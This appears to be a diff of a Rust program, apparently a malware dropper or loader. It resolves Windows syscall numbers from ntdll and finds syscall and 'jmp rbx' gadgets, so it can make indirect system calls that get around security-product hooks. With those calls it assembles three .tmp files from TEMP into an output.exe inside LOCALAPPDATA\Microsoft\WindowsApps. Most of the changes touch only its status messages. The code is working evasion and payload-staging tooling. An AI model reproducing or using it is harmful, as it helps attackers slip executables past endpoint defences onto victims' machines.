@@ -68,34 +68,27 @@ fn main() {
         let nt_write_file_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtWriteFile").expect("Failed to get NtWriteFile SSN");
         let nt_close_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtClose").expect("Failed to get NtClose SSN");
 
+        println!("[+] Resolved SSNs: NtCreateFile(0x{:X}), NtReadFile(0x{:X}), NtWriteFile(0x{:X}), NtClose(0x{:X})",
+                 nt_create_file_ssn, nt_read_file_ssn, nt_write_file_ssn, nt_close_ssn);
+
         let syscall_gadget = syscalls::find_syscall_gadget(ntdll_base as *const u8).expect("Failed to find syscall gadget");
         let jmp_rbx_gadget = syscalls::find_jmp_rbx_gadget(ntdll_base as *const u8).expect("Failed to find jmp rbx gadget");
 
-        println!("[*] Syscall Gadget: {:?}", syscall_gadget);
-        println!("[*] JMP RBX Gadget: {:?}", jmp_rbx_gadget);
+        println!("[*] Syscall Gadget (executable): {:?}", syscall_gadget);
+        println!("[*] JMP RBX Gadget (executable): {:?}", jmp_rbx_gadget);
 
-        let temp_dir = std::env::var("TEMP").unwrap_or_else(|_| {
-            println!("[!] TEMP environment variable not found, using default.");
-            "C:\\Windows\\Temp".to_string()
-        });
-        let local_app_data = std::env::var("LOCALAPPDATA").unwrap_or_else(|_| {
-            println!("[!] LOCALAPPDATA environment variable not found, using default.");
-            "C:\\Users\\Default\\AppData\\Local".to_string()
-        });
-
-        println!("[*] TEMP directory: {}", temp_dir);
-        println!("[*] LOCALAPPDATA directory: {}", local_app_data);
+        let temp_dir = std::env::var("TEMP").unwrap_or_else(|_| "C:\\Windows\\Temp".to_string());
+        let local_app_data = std::env::var("LOCALAPPDATA").unwrap_or_else(|_| "C:\\Users\\Default\\AppData\\Local".to_string());
 
         let target_dir = format!("{}\\Microsoft\\WindowsApps", local_app_data);
-        if let Err(e) = std::fs::create_dir_all(&target_dir) {
-            println!("[!] Warning: Failed to create target directory {}: {}", target_dir, e);
-        }
+        println!("[*] Ensuring target directory exists: {}", target_dir);
+        let _ = std::fs::create_dir_all(&target_dir);
 
         let out_path_str = format!("{}\\output.exe", target_dir);
         let out_path_wide = to_nt_path(&out_path_str);
         let out_unicode = create_unicode_string(&out_path_wide);
 
-        println!("[*] Target file path: {}", out_path_str);
+        println!("[*] Attempting to create output file: {}", out_path_str);
 
         let mut out_handle: HANDLE = 0;
         let mut io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };
@@ -108,6 +101,7 @@ fn main() {
             SecurityQualityOfService: null_mut(),
         };
 
+        println!("[*] Calling NtCreateFile...");
         let status = syscall!(
             nt_create_file_ssn,
             syscall_gadget,
@@ -126,10 +120,10 @@ fn main() {
         );
 
         if status != 0 {
-            println!("[-] NtCreateFile (output) failed with status: 0x{:08X}", status as u32);
+            println!("[-] NtCreateFile (output) failed with NTSTATUS: 0x{:08X}", status as u32);
             return;
         }
-        println!("[+] Successfully opened/created output file handle: {:?}", out_handle);
+        println!("[+] Successfully created output file handle: {:?}", out_handle);
 
         for i in 1..=3 {
             let in_path_str = format!("{}\\{}.tmp", temp_dir, i);
@@ -164,7 +158,7 @@ fn main() {
             );
 
             if status == 0 {
-                println!("[+] Merging {}...", in_path_str);
+                println!("[+] Opened {}.tmp. Merging...", i);
                 let mut buffer = [0u8; 8192];
                 let mut total_read = 0;
                 loop {
@@ -218,14 +212,14 @@ fn main() {
                         break;
                     }
                 }
-                println!("[+] Merged {} bytes from {}", total_read, in_path_str);
+                println!("[+] Merged {} bytes from {}.tmp", total_read, i);
                 syscall!(nt_close_ssn, syscall_gadget, jmp_rbx_gadget, in_handle as usize);
             } else {
-                println!("[-] Failed to open {} for reading, status: 0x{:08X}", in_path_str, status as u32);
+                println!("[-] Skipping {}.tmp, status: 0x{:08X}", i, status as u32);
             }
         }
 
         syscall!(nt_close_ssn, syscall_gadget, jmp_rbx_gadget, out_handle as usize);
-        println!("[+] Process complete.");
+        println!("[+] Finished all operations.");
     }
 }
